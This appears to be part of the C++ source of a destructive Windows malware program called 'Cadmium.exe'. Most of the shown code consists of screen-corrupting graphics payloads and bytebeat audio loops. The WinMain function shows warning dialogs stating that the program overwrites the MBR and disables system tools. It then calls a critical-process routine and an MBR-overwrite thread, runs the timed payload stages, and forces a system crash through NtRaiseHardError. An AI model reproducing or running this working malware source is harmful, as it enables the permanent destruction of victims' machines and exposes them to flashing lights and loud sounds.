        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };

        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                float fx = (int)((i ^ 4) * ((x * y * i) / 1000));

                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 4000.f + y / h * .2f, 1.f);

                hslcolor.s = 1.f;
                hslcolor.l += .1f;

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;

        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);

        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI payload6(LPVOID lpParam) { // Credits to VenraTech for this payload, but I modified it
    HDC hdcScreen = GetDC(0);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0);
    INT h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCAND);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            double fractalX = (2.5f / w);
            double fractalY = (1.90f / h);

            double cx = x * fractalX - 2.f;
            double cy = y * fractalY - 0.95f;

            double zx = 0;
            double zy = 0;

            int fx = 0;

            while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
            {
                double fczx = zx * zx - zy * zy + cx;
                double fczy = 2 * zx * zy + cy;

                zx = fczx;
                zy = fczy;
                fx++;


                rgbScreen[i].r = rand() % fx;
                rgbScreen[i].g = rand() % fx;
                rgbScreen[i].b = rand() % fx;
                rgbScreen[i].rgb *= 2;
            }
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCAND);
        ReleaseDC(NULL, hdcScreen);
        DeleteDC(hdcScreen);
    }
}

DWORD WINAPI blur(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(0);
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hdcCopy, bmp);

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 50;

loop:
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, brush);
    BitBlt(hdcCopy, rand() % 10, rand() % 10, w, h, hdc, rand() % -10, rand() % -10, SRCPAINT);
    BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, PATINVERT);
    DeleteObject(brush);
    AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
    goto loop;

    return 0x00;
}

DWORD WINAPI iconbounce(LPVOID lpParam) {
    int sx = 1, sy = 1;
    int incrementation = 5;
    int x = 10, y = 10;
    while (true) {
        HDC hdc = GetDC(0);
        x += incrementation * sx;
        y += incrementation * sy;
        DrawIconEx(hdc, x, y, LoadIcon(NULL, IDI_ERROR), 1 * GetSystemMetrics(11), 1 * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
        if (y >= GetSystemMetrics(1)) {
            sy = -1;
        }
        if (x >= GetSystemMetrics(0)) {
            sx = -1;
        }
        if (y == 0) {
            sy = 1;
        }
        if (x == 0) {
            sx = 1;
        }
        ReleaseDC(0, hdc);
        Sleep(5);
    }
}

DWORD WINAPI payload7(LPVOID lpParam) { // Credits to camellia-y7x for this effect, even if it's skidded, but I modified it

    int blocksize = 80;
    int xxx = 0;

    POINT point[3];

    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);

        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int rndsize = 1 + rand() % (h / 2);
        int increment = 10 + rand() % 40;

        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };

        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);

        SelectObject(hcdc, hBitmap);

        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);

        for (int yyy = 0; yyy < h; yyy += rndsize) {
            StretchBlt(hcdc, -20 + rand() % 50, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCCOPY);
        }

        for (int x = 0; x <= w; x += blocksize) {
            for (int y = 0; y <= h; y += blocksize) {
                int rndx = x + (-1 + rand() % 3), rndy = y + (-1 + rand() % 3);
                int rndx2 = x + (-1 + rand() % 3), rndy2 = y + (-1 + rand() % 3);
                int luckynum = 1 + rand() % 11, rop = SRCINVERT;
                if (luckynum == 5) { rop = SRCAND; }
                else if (luckynum == 10) { rop = SRCPAINT; }
                StretchBlt(hcdc, rndx, rndy, blocksize, blocksize, hcdc, rndx2, rndy2, blocksize, blocksize, rop);
            }
        }

        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb += i * h + xxx & (i % w + i / w) | i & (w + h) + xxx;
        }

        if (rand() % 8 >= 5) { BitBlt(hcdc, rand() % 400, rand() % 400, w, h, hcdc, rand() % 400, rand() % 400, SRCPAINT); }
        if (rand() % 10 >= 6) {
            point[0].x = increment; point[0].y = -increment;
            point[1].x = w + increment; point[1].y = increment;
            point[2].x = -increment; point[2].y = h - increment;
        }

        else {
            point[0].x = -increment; point[0].y = increment;
            point[1].x = w - increment; point[1].y = -increment;
            point[2].x = increment; point[2].y = h + increment;
        }

        PlgBlt(hcdc, point, hcdc, 0, 0, w, h, 0, 0, 0);
        BitBlt(hcdc, rand() % 10, rand() % 10, w, h, hcdc, rand() % 10, rand() % 10, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);

        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);

        blocksize += 2; if (blocksize >= 200) { blocksize = 80; }
    }
}

DWORD WINAPI FINALE(LPVOID lpParam) { // finale.exe reference lol
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 1000, rand() % 1000, rand() % w, rand() % h, hdc, rand() % 1000, rand() % 1000, SRCCOPY);
        BitBlt(hdc, rand() % 1000, rand() % 1000, rand() % w, rand() % h, hdc, rand() % 1000, rand() % 1000, NOTSRCCOPY);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI plasmahsl2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = (int)(i ^ 4) + (i * 4) + (x ^ y);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);

                hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx | x ^ y) / 10000.0 + 0.09, 1.0);
                hslcolor.s = 1.f;

                if (hslcolor.l < .4f)
                {
                    hslcolor.l += .2f;
                }

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

VOID WINAPI bytebeat1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((((t / (8192 + (t >> 7))) * (t >> 8)) + (t >> 8)) * t) & 128;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 13 | t >> 8 & t >> 4) / (1 + (t >> 1 & t >> 11))) - 2;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t | t / (1 + (1 / 128))) * (t >> 8);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat4() { // Credits to 216 for the bytebeat, but I modified it
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t ^ t + (t >> 15 | 1) ^ (t - 1280 ^ t) >> 11)) & 128;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat5() { // Credits to wiretapped for this bytebeat, but I modified it
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> (t >> 12) % 4) + t * (1 + (1 + (t >> 16) % 6) * (t >> 10) * (t >> 11) % 8) ^ t >> 13) * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 9 & 1 + t >> 10 & 0 ? 0 : 10000 / (1 + (t % 8192)) - t / 18 & 8 ? -1 : 0) ^ t >> 5 & ((t * t / (1 + (t % 8192)) | t >> 2) * (t >> 12) >> 4);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 9) & (t / 15)) * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI FINALSOUND(LPVOID lpParam) {
    while (1) {
        Beep(rand() % 10000, rand() % 100);
}
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (GetFileAttributesW(L"C:\\Windows\\WinNet.exe") == INVALID_FILE_ATTRIBUTES) {
        if (MessageBoxW(NULL, L"What you've just executed is a type of malware that can damage your PC.\n\nThis malware can disable important programs (such as Task Manager, Registry editor, etc.) and can set itself as a critical process, which means that your PC will crash if you end it.\n\nThis malware also can overwrite the MBR, which makes your PC unusable/unfixable.\n\nSo, do you want to run this malware, resulting in intense destruction?", L"Cadmium.exe", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\n\nARE YOU SURE YOU WANT TO RUN THIS MALWARE?\n\nTHE CREATOR (UltraDasher965) ISN'T RESPONSIBLE FOR ANY DAMAGE MADE USING THIS COMPUTER. THIS MALWARE ALSO CONTAINS FLASHING LIGHTS AND LOUD SOUNDS.\n\nDO YOU STILL WANT TO RUN IT?", L"Cadmium.exe - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    }
    ProcessIsCritical();
    CreateThread(0, 0, mbr, 0, 0, 0);
    CreateThread(0, 0, taskbarpoof, 0, 0, 0);
    Sleep(1000 * 5);
    if (MessageBoxW(NULL, L"Unknown error", L" ", MB_ICONERROR | MB_OK) != IDOK) return 1;
    Sleep(1000 * 5);
    HANDLE thread = CreateThread(0, 0, payload1, 0, 0, 0);
    HANDLE hsl_first = CreateThread(0, 0, hsl1, 0, 0, 0);
    bytebeat1();
    Sleep(30000);
    TerminateThread(thread, 0);
    CloseHandle(thread);
    TerminateThread(hsl_first, 0);
    CloseHandle(hsl_first);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
    HANDLE hsl_second = CreateThread(0, 0, hsl2, 0, 0, 0);
    bytebeat2();
    Sleep(30000);
    TerminateThread(thread2, 0);
    CloseHandle(thread2);
    TerminateThread(hsl_second, 0);
    CloseHandle(hsl_second);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
    HANDLE plasmahsl_first = CreateThread(0, 0, plasmahsl1, 0, 0, 0);
    bytebeat3();
    Sleep(30000);
    TerminateThread(thread3, 0);
    CloseHandle(thread3);
    TerminateThread(plasmahsl_first, 0);
    CloseHandle(plasmahsl_first);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
    bytebeat4();
    Sleep(30000);
    TerminateThread(thread4, 0);
    CloseHandle(thread4);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE texts = CreateThread(0, 0, textouts, 0, 0, 0);
    HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
    HANDLE mash = CreateThread(0, 0, masher, 0, 0, 0);
    HANDLE hsl_third = CreateThread(0, 0, hsl3, 0, 0, 0);
    bytebeat5();
    Sleep(30000);
    TerminateThread(thread5, 0);
    CloseHandle(thread5);
    TerminateThread(mash, 0);
    CloseHandle(mash);
    TerminateThread(hsl_third, 0);
    CloseHandle(hsl_third);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
    HANDLE floutage = CreateThread(0, 0, blur, 0, 0, 0);
    HANDLE bouncingicon = CreateThread(0, 0, iconbounce, 0, 0, 0);
    bytebeat6();
    Sleep(30000);
    TerminateThread(thread6, 0);
    CloseHandle(thread6);
    TerminateThread(floutage, 0);
    CloseHandle(floutage);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
    bytebeat7();
    Sleep(30000);
    TerminateThread(thread7, 0);
    CloseHandle(thread7);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE venramoment = CreateThread(0, 0, FINALE, 0, 0, 0);
    HANDLE venramoment2 = CreateThread(0, 0, FINALSOUND, 0, 0, 0);
    HANDLE plasmahsl_second = CreateThread(0, 0, plasmahsl2, 0, 0, 0);
    CreateThread(0, 0, shaking, 0, 0, 0);
    CreateThread(0, 0, opener, 0, 0, 0);
    Sleep(30000);
    TerminateThread(venramoment, 0);
    CloseHandle(venramoment);
    TerminateThread(venramoment2, 0);
    CloseHandle(venramoment2);
    TerminateThread(plasmahsl_second, 0);
    CloseHandle(plasmahsl_second);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    BOOLEAN bl;
    DWORD response;
    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege(19, 1, 0, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
    Sleep(-1);
}
